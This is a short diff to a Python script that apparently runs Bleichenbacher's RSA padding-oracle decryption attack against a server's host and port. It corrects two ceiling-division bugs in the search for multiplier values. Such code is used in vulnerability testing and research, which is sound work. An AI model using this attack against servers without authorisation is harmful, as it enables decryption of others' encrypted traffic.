@@ -392,7 +392,7 @@ def perform_decrypt_attack(host_name, server_port, ciphertext, s_quiet=True, s_c
       # find pairs r,s such that m*s % N = m*s-r*N is PKCS conforming
       # 2.a)
       if i == 1:
-          s = N // (3 * B)
+          s = -(-N // (3 * B))
           cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
           while not BleichenbacherOracle(cc):
               s += 1
@@ -411,7 +411,7 @@ def perform_decrypt_attack(host_name, server_port, ciphertext, s_quiet=True, s_c
           a, b = M.pop()
           M.add((a, b))
           r = 2 * (b * s - 2 * B) // N
-          s = -(-(2 * B + r * N // b))
+          s = -(-(2 * B + r * N) // b)
           cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
           while not BleichenbacherOracle(cc):
               s += 1
